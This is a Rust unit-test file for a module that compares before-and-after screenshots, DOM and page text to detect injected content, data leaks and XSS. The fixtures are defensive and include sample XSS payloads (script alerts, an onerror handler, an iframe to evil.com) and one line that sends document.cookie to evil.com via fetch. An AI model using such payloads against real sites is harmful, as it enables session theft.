use crate::visual_regression::*;

#[test]
fn pixel_diff_identical_images() {
    let width = 4;
    let height = 4;
    let pixels: Vec<u8> = vec![255, 0, 0, 255].repeat(16);
    let config = VisualRegressionConfig::default();

    let result = pixel_diff(&pixels, &pixels, width, height, &config);
    assert_eq!(result.changed_pixels, 0);
    assert!((result.change_percentage - 0.0).abs() < 0.001);
    assert!(!result.is_significant);
}

#[test]
fn pixel_diff_completely_different() {
    let width = 4;
    let height = 4;
    let before: Vec<u8> = vec![255, 0, 0, 255].repeat(16);
    let after: Vec<u8> = vec![0, 255, 0, 255].repeat(16);
    let config = VisualRegressionConfig::default();

    let result = pixel_diff(&before, &after, width, height, &config);
    assert_eq!(result.changed_pixels, 16);
    assert!((result.change_percentage - 1.0).abs() < 0.001);
    assert!(result.is_significant);
}

#[test]
fn pixel_diff_partial_change() {
    let width = 4;
    let height = 4;
    let mut before: Vec<u8> = vec![128, 128, 128, 255].repeat(16);
    let mut after = before.clone();
    // Change first 4 pixels to be very different
    for i in 0..4 {
        after[i * 4] = 0;
        after[i * 4 + 1] = 0;
        after[i * 4 + 2] = 0;
    }
    let config = VisualRegressionConfig::default();

    let result = pixel_diff(&before, &after, width, height, &config);
    assert_eq!(result.changed_pixels, 4);
    assert!((result.change_percentage - 0.25).abs() < 0.001);
}

#[test]
fn pixel_diff_threshold_sensitivity() {
    let width = 10;
    let height = 10;
    let before: Vec<u8> = vec![128, 128, 128, 255].repeat(100);
    let mut after = before.clone();
    after[0] = 0; // Change one pixel
    after[1] = 0;
    after[2] = 0;

    let strict_config = VisualRegressionConfig::default().with_pixel_change_threshold(0.001);
    let lenient_config = VisualRegressionConfig::default().with_pixel_change_threshold(0.5);

    let strict_result = pixel_diff(&before, &after, width, height, &strict_config);
    let lenient_result = pixel_diff(&before, &after, width, height, &lenient_config);

    assert!(strict_result.is_significant);
    assert!(!lenient_result.is_significant);
}

#[test]
fn dom_diff_no_changes() {
    let html = "<div id=\"app\">Hello World</div>";
    let result = dom_diff(html, html);
    assert_eq!(result.total_changes, 0);
    assert!(!result.has_injected_content);
}

#[test]
fn dom_diff_detects_added_script() {
    let before = "<div id=\"app\">Hello</div>";
    let after = "<div id=\"app\">Hello</div><script>alert(1)</script>";

    let result = dom_diff(before, after);
    assert!(!result.added_elements.is_empty());
    assert!(result.has_injected_content);
    assert!(result.added_elements.iter().any(|e| e.tag == "script"));
}

#[test]
fn dom_diff_detects_added_iframe() {
    let before = "<div>Normal content</div>";
    let after = "<div>Normal content</div><iframe src=\"evil.com\">hack</iframe>";

    let result = dom_diff(before, after);
    assert!(result.has_injected_content);
}

#[test]
fn dom_diff_detects_removed_elements() {
    let before = "<div id=\"main\">Content</div><p id=\"footer\">Footer</p>";
    let after = "<div id=\"main\">Content</div>";

    let result = dom_diff(before, after);
    assert!(!result.removed_elements.is_empty());
}

#[test]
fn text_diff_no_changes() {
    let text = "Hello World\nLine 2\nLine 3";
    let result = text_diff(text, text);
    assert!(result.added_text.is_empty());
    assert!(result.removed_text.is_empty());
    assert!(!result.has_data_leak);
}

#[test]
fn text_diff_detects_added_text() {
    let before = "Normal page content";
    let after = "Normal page content\nNew suspicious data";

    let result = text_diff(before, after);
    assert!(!result.added_text.is_empty());
}

#[test]
fn text_diff_detects_email_leak() {
    let before = "Welcome to the site";
    let after = "Welcome to the site\nadmin@internal.company.com was found";

    let result = text_diff(before, after);
    assert!(result.has_data_leak);
    assert!(result
        .leaked_patterns
        .iter()
        .any(|p| p.pattern_type == LeakPatternType::Email));
}

#[test]
fn text_diff_detects_sql_error_leak() {
    let before = "Product listing page";
    let after = "Product listing page\nSQL syntax error near 'SELECT * FROM users'";

    let result = text_diff(before, after);
    assert!(result.has_data_leak);
    assert!(result
        .leaked_patterns
        .iter()
        .any(|p| p.pattern_type == LeakPatternType::SqlError));
}

#[test]
fn text_diff_detects_path_leak() {
    let before = "Error occurred";
    let after = "Error occurred\n/var/www/html/config/database.yml";

    let result = text_diff(before, after);
    assert!(result.has_data_leak);
    assert!(result
        .leaked_patterns
        .iter()
        .any(|p| p.pattern_type == LeakPatternType::InternalPath));
}

#[test]
fn text_diff_detects_stack_trace() {
    let before = "Something went wrong";
    let after = "Something went wrong\nat com.example.Service.handle(Service.java:42)";

    let result = text_diff(before, after);
    assert!(result.has_data_leak);
    assert!(result
        .leaked_patterns
        .iter()
        .any(|p| p.pattern_type == LeakPatternType::StackTrace));
}

#[test]
fn detect_new_script_tag_xss() {
    let before = "<html><body><p>Normal</p></body></html>";
    let after = "<html><body><p>Normal</p><script>alert('xss')</script></body></html>";

    let indicators = detect_xss_indicators(before, after);
    assert!(indicators
        .iter()
        .any(|i| i.indicator_type == XssIndicatorType::NewScriptTag));
    assert!(indicators
        .iter()
        .any(|i| i.indicator_type == XssIndicatorType::AlertDialog));
}

#[test]
fn detect_new_iframe_xss() {
    let before = "<div>Content</div>";
    let after =
        "<div>Content</div><iframe src='data:text/html,<script>alert(1)</script>'></iframe>";

    let indicators = detect_xss_indicators(before, after);
    assert!(indicators
        .iter()
        .any(|i| i.indicator_type == XssIndicatorType::NewIframe));
}

#[test]
fn detect_event_handler_injection() {
    let before = r#"<img src="photo.jpg">"#;
    let after = r#"<img src="photo.jpg" onerror="alert(1)">"#;

    let indicators = detect_xss_indicators(before, after);
    assert!(indicators
        .iter()
        .any(|i| i.indicator_type == XssIndicatorType::NewEventHandler));
}

#[test]
fn detect_cookie_access_injection() {
    let before = "<script>var x = 1;</script>";
    let after = "<script>var x = 1; fetch('http://evil.com/?c='+document.cookie);</script>";

    let indicators = detect_xss_indicators(before, after);
    assert!(indicators
        .iter()
        .any(|i| i.indicator_type == XssIndicatorType::CookieAccess));
}

#[test]
fn no_xss_indicators_for_identical_pages() {
    let html = "<html><body><p>Safe content</p></body></html>";
    let indicators = detect_xss_indicators(html, html);
    assert!(indicators.is_empty());
}

#[test]
fn full_analysis_confirmed_xss() {
    let before = "<html><body><div>Normal</div></body></html>";
    let after =
        "<html><body><div>Normal</div><script>alert(document.cookie)</script></body></html>";
    let config = VisualRegressionConfig::default();

    let result = analyze_visual_regression(None, None, before, after, &config);
    assert_eq!(result.verdict, AttackVerdict::Confirmed);
    assert!(result.dom_diff.has_injected_content);
    assert!(!result.xss_indicators.is_empty());
}

#[test]
fn full_analysis_not_detected() {
    let before = "<html><body><div>Page A</div></body></html>";
    let after = "<html><body><div>Page A</div></body></html>";
    let config = VisualRegressionConfig::default();

    let result = analyze_visual_regression(None, None, before, after, &config);
    assert_eq!(result.verdict, AttackVerdict::NotDetected);
}

#[test]
fn full_analysis_data_leak_inconclusive() {
    let before = "<div>Welcome</div>";
    let after = "<div>Welcome</div><p>Error: /var/www/app/config.yml not found</p>";
    let config = VisualRegressionConfig::default();

    let result = analyze_visual_regression(None, None, before, after, &config);
    assert!(
        result.verdict == AttackVerdict::Inconclusive || result.verdict == AttackVerdict::Likely
    );
    assert!(result.text_diff.has_data_leak);
}

#[test]
fn full_analysis_with_screenshots() {
    let width = 2;
    let height = 2;
    let before_pixels: Vec<u8> = vec![255, 255, 255, 255].repeat(4);
    let mut after_pixels = before_pixels.clone();
    after_pixels[0] = 0;
    after_pixels[1] = 0;
    after_pixels[2] = 0;

    let before_html = "<div>Hello</div>";
    let after_html = "<div>Hello</div>";
    let config = VisualRegressionConfig::default();

    let result = analyze_visual_regression(
        Some((&before_pixels, width, height)),
        Some((&after_pixels, width, height)),
        before_html,
        after_html,
        &config,
    );

    assert!(result.pixel_diff.is_some());
    let pd = result.pixel_diff.unwrap();
    assert!(pd.changed_pixels > 0);
}

#[test]
fn visual_regression_config_builder() {
    let config = VisualRegressionConfig::default()
        .with_pixel_change_threshold(0.05)
        .with_significant_region_min_pixels(50);
    assert!((config.pixel_change_threshold - 0.05).abs() < 0.001);
    assert_eq!(config.significant_region_min_pixels, 50);
}

#[test]
fn attack_verdict_ordering() {
    assert_ne!(AttackVerdict::Confirmed, AttackVerdict::NotDetected);
    assert_ne!(AttackVerdict::Likely, AttackVerdict::Inconclusive);
}

#[test]
fn changed_region_contains_position() {
    let width = 10;
    let height = 10;
    let before: Vec<u8> = vec![128, 128, 128, 255].repeat(100);
    let mut after = before.clone();
    // Create a 3x3 block of changes at position (2,2)
    for dy in 0..3u32 {
        for dx in 0..3u32 {
            let idx = ((2 + dy) * width + (2 + dx)) as usize * 4;
            after[idx] = 0;
            after[idx + 1] = 0;
            after[idx + 2] = 0;
        }
    }

    let config = VisualRegressionConfig::default().with_significant_region_min_pixels(1);
    let result = pixel_diff(&before, &after, width, height, &config);
    assert!(!result.changed_regions.is_empty());
}

#[test]
fn detect_database_query_leak() {
    let before = "Normal page";
    let after = "Normal page\nSELECT username, password FROM users WHERE id = 1";

    let result = text_diff(before, after);
    assert!(result.has_data_leak);
    assert!(result
        .leaked_patterns
        .iter()
        .any(|p| p.pattern_type == LeakPatternType::DatabaseRecord));
}
